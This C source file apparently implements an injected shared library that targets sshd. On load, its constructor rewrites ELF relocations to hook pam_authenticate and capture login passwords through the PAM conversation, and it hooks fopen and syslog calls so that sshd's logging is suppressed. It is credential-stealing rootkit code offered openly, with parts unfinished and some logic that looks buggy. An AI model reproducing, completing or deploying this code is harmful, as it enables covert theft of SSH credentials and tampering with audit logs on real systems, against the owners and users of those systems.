#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <errno.h>
#include <signal.h>
#include <setjmp.h>

#include <security/pam_appl.h>
#include <sys/mman.h>

#include <dlfcn.h>
#include <link.h>

#include <sys/shm.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <inttypes.h>

#include "pam_private.h"

#include "bad.h"
#include "config_hook.h"


static int PAGE_SIZE;

static void handle_sig_with_jmp(int sig)
{
	longjmp(jmpbuf, -1);
}

/*
 * lib = start of lib we search - use get_libstart()
 */
static void *find_func_ptr(struct link_map *link_map, void *lib, char *funcname)
{
	struct link_map *map = link_map;
	Dl_info *dli = malloc(sizeof(Dl_info));

	while (map != NULL) {
		if ((void *) map->l_addr == lib) {
			void *libstart = (void *)map->l_addr;

			void *libend = (void *)map->l_next->l_addr;

			bool done = false;

			while (done != true && libstart >= libend) {
				dladdrptr(libstart, dli);

				if (dli->dli_sname != NULL && dli->dli_saddr != NULL) {
					if (strcmp(dli->dli_sname, funcname) == 0) {
						void *tmp = dli->dli_saddr;
						free(dli);
						return tmp;
					}
				}
				libstart += 16;
			}
		}
		map = map->l_next;
	}

	free(dli);
	return NULL;
}

static void *get_libstart(struct link_map *link_map, char *lib)
{
	struct link_map *map = link_map;

	while (map != NULL) {
		if (strstr(map->l_name, lib) != NULL)
			return (void *)map->l_addr;

		map = map->l_next;
	}

	return NULL;
}

/*
 * Parse a dynamic section array for useful pointers
 * CHECK RESULTS -- number of elements in a .dynamic can be wonky...
 * TODO: there is probably a way to get the correct number of elements in a .dynamic array
 *	so we don't blow something up
 */
static void parse_dyn_array(Elf64_Dyn *dynptr, int elements, Elf64_Rela **RELA,
					 uint64_t **RELASZ, Elf64_Rela **JMPREL, uint64_t **PLTRELSZ)
{
	*RELA = NULL;
	*RELASZ = NULL;
	*JMPREL = NULL;
	*PLTRELSZ = NULL;	

	int i;

	for (i = 0; i < elements; i++) {
		if (dynptr[i].d_tag == DT_RELA)
			*RELA = (Elf64_Rela *) &dynptr[i].d_un;
		else if (dynptr[i].d_tag == DT_JMPREL)
			*JMPREL = (Elf64_Rela *) &dynptr[i].d_un;
		else if (dynptr[i].d_tag == DT_PLTRELSZ)
			*PLTRELSZ = (uint64_t *) &dynptr[i].d_un;
		else if (dynptr[i].d_tag == DT_RELASZ)
			*RELASZ = (uint64_t *) &dynptr[i].d_un;
	}
	return;
}

/*
 * parses a .dynamic relocation table (DT_RELA || DT_JMPREL) to return the Elf64_Rela * entry associated 
 *	with the func we want to hook...
 *
 * TODO: this is so slow... better to pass in struct[] { void *func, int type } if we are going to only hook ~10 funcs...?
 */
static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func, int *type)
{
	uint64_t relaments = *RELASZ / (sizeof(Elf64_Rela));

	int i;
	for (i = 0; i < relaments; i++) {
		if ((void *) RELA[0].r_addend == func) {
			*type = RELOC_ADDEND;
			return RELA;
		}
		
		if ((void *) RELA[0].r_info == func) {
			*type = RELOC_INFO;
			return RELA;
		}

		RELA = (Elf64_Rela *) ((char *) RELA + (unsigned long long) (sizeof(Elf64_Rela)));
	}
	return NULL;
}

/*
 * the callback for dl_iterate_phdr
 *
 * TODO: make null1/null2 not suck
 */
static int callback(struct dl_phdr_info *info, size_t size, void *data)
{
	if (null1 != NULL && null2 != NULL && libc != NULL) /* :speedmeup: */
		return 0;	

	int j;

	for (j = 0; j < info->dlpi_phnum; j++) {
		
		if ((unsigned int)info->dlpi_phdr[j].p_type == PT_DYNAMIC) {
			if (strstr(info->dlpi_name, ".so") == NULL) {
				if (info->dlpi_phnum == (unsigned)9) {
					null1 = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
					break;
				}
				if (info->dlpi_phnum == (unsigned)4) {
					null2 = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
					break;
				}
			}
			if (strstr(info->dlpi_name, "libc.so") != NULL) {
				libc = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
				break;
			}
		}
	}
	return 0;
}

/*
 *
 */
static int hook_rela(Elf64_Rela *foundrela, void *func, int type)
{
	int ret;
	uint64_t prevpage = ((uint64_t) foundrela / PAGE_SIZE) * PAGE_SIZE;

	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ | PROT_WRITE);
	if (ret != 0)
		return -1;

	if (type == RELOC_ADDEND)
		foundrela->r_addend = (unsigned long long) func; 
	else if (type == RELOC_INFO)
		foundrela->r_info = (unsigned long long) func; 

	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ);
	if (ret != 0)
		return -1;

	return 0;
}

static int is_sshd(struct link_map *link_map)
{
	void *dlhandle = dlopen("libdl.so.2", RTLD_NOW);

	if (dlhandle == NULL)
		return -1;

	dlinfoptr = dlsym(dlhandle, "dlinfo");
	dladdrptr = dlsym(dlhandle, "dladdr");
	dlclose(dlhandle);

	if (dlinfoptr == NULL || dladdrptr == NULL)
		return -1;

	void *ourhandle = dlopen(NULL, RTLD_NOW);

	dlinfoptr(ourhandle, 2, &link_map);
	dlclose(ourhandle);

	void *wrapstart = get_libstart(link_map, "libwrap.so.0");

	if (wrapstart == NULL)
		return -1;

	void *pamstart = get_libstart(link_map, "libpam.so.0");

	if (pamstart == NULL)
		return -1;

	void *hosts_access = find_func_ptr(link_map, wrapstart, "hosts_access");
	void *pam_authenticate = find_func_ptr(link_map, pamstart, "pam_authenticate");

	if (hosts_access == NULL || pam_authenticate == NULL)
		return -1;

	return 0;
}

/*
 *
 */
static int my_pam_auth(struct pam_handle *pamh, int flags)
{
	__asm__ (
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		);

	struct pam_conv *conver = pamh->pam_conversation;

	struct pam_message *msg = malloc(sizeof(struct pam_message));
	msg->msg_style = PAM_PROMPT_ECHO_OFF;
	msg->msg = NULL;

	struct pam_response *resp = calloc(0, sizeof(struct pam_response));

	conver->conv(1, (const struct pam_message **) &msg, &resp, NULL);	
	/* thanks for the password! */

	
	free(msg);
	free(resp);		
	return 0;
}

/*
 * openssh 6.0p1 and 6.8p1 both use __syslog_chk
 */
static int my_syslog_chk(int priority, int flag, const char *format)
{
	FILE *fp = fopen("/root/asf", "a+");
	fprintf(fp, "in __syslog_chk ayylmao\n");
	fflush(fp);
	fclose(fp);

	return 0;
}

void my_pam_syslog(pam_handle_t *pamh, int priority, const char *fmt, ...)
{
	/*
	va_list args;

	va_start (args, fmt);
	pam_vsyslog (pamh, priority, fmt, args);
	va_end (args);
	*/
	FILE *fp = fopen("/root/asd", "a+");
	fprintf(fp, "in pam_syslog ayylmao\n");
	fflush(fp);
	fclose(fp);



}


static void  __attribute__ ((constructor)) init(void)
{
	struct link_map *link_map;

	if (is_sshd(link_map) != 0)
		return;

	PAGE_SIZE = getpagesize();

	void *ourhandle = dlopen(NULL, RTLD_NOW);

	dlinfoptr(ourhandle, 2, &link_map);
	dlclose(ourhandle);

	void *o = dlopen("libdl-2.13.so", RTLD_NOW);
	dl_iterate_phdrptr = dlsym(o, "dl_iterate_phdr");
	dlclose(o);
	dl_iterate_phdrptr(callback, NULL);

	if (null1 == NULL)
		return;


	Elf64_Rela *RELA, *JMPREL;
	uint64_t *RELASZ, *PLTRELSZ;
	int type;

	parse_dyn_array(null1, 30, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
		return;

	void *pamstart = get_libstart(link_map, "libpam.so.0");
	void *pam_authenticate = find_func_ptr(link_map, pamstart, "pam_authenticate");

	Elf64_Rela *foundrela = parse_rela(RELA, RELASZ, pam_authenticate, &type);
	if (foundrela == NULL)
		return;

	int jmpret = setjmp(jmpbuf);
	if (jmpret != 0) { /* PANIC */
		kill(getpid(), SIGSEGV);
		return;
	}

	signal(SIGSEGV, handle_sig_with_jmp);
	signal(SIGBUS, handle_sig_with_jmp);

	/* TODO: test type (parse_rela() paramter) */
	hook_rela(foundrela, my_pam_auth, type);

	signal(SIGSEGV, SIG_DFL);
	signal(SIGBUS, SIG_DFL);


	/* XXX: all of this crap deserves a wrapper - ? muh modularity */

	void *libcstart = get_libstart(link_map, "libc.so.6");
	void *libc_func = find_func_ptr(link_map, libcstart, "fopen");

	/* the relocation of fopen lives within sshd's dynamic */
	parse_dyn_array(null1, 30, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
		return;


	/* changeme: s/foundrela/ref_fopen_Rela/g -- inside my_fopen we will need to change fopen back to normal :^) */
	foundrela = parse_rela(RELA, RELASZ, libc_func, &type);
	if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
		foundrela = parse_rela(JMPREL, PLTRELSZ, libc_func, &type);
	if (foundrela == NULL) /* :( */
		return;

	/* checking type is pretty much a formaility at the moment -- but will be useful later */
	if (type == RELOC_ADDEND) {
		ref_fopen = (void *) foundrela->r_addend;

		ref_fopen_Rela = foundrela;


		hook_rela(foundrela, my_fopen, type);
	}

	//libcstart = get_libstart(link_map, "libc.so.6");
	libc_func = find_func_ptr(link_map, libcstart, "__syslog_chk");

	foundrela = parse_rela(RELA, RELASZ, libc_func, &type);
	if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
		foundrela = parse_rela(JMPREL, PLTRELSZ, libc_func, &type);
	
	if (type == RELOC_INFO)
		hook_rela(foundrela,  my_syslog_chk, type);


	/* TODO: hook pam_syslog */
	void *pam_syslog = find_func_ptr(link_map, pamstart, "pam_syslog");



	
	
	return;
}
